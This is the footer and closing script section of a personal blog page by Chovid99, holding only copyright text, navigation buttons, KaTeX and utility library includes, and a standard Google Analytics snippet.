        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
